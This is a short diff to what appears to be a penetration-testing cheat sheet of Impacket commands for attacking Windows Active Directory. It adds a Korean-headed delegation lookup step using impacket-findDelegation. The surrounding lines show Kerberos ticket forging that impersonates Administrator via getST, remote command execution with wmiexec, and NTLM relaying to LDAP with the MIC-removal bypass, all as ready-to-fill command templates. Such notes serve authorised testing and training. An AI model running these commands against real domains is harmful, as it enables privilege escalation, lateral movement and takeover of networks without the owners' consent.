@@ -370,6 +370,9 @@ impacket-getST -spn '<SPN>' -impersonate Administrator -altservice '<ALT_SPN>' -
 impacket-wmiexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP>
 impacket-wmiexec -k -no-pass <IP>
 
+## Delegation 조회
+impacket-findDelegation <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP>
+
 ## ntlmrelay
 impacket-ntlmrelayx -t ldap://<IP> -smb2support --remove-mic
 
